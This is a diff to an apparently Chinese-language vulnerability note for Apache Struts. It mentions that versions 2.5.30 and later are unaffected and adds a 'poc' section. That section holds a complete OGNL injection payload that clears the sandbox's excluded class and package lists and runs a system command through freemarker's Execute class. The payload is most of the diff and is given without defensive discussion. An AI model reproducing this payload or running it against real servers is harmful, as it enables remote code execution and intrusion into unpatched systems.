@@ -18,7 +18,19 @@ Struts ≥ 2.5.30的版本不受影响
 
 https://struts.apache.org/download.cgi#struts-ga
 
+# poc 
+-----
 
+(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
+(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
+(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
+(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
+(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))
 
+-----
 
 <img width="655" alt="image" src="https://user-images.githubusercontent.com/59011386/163543243-75d0c081-7b85-4a59-8b96-eaafdb0c18a4.png">
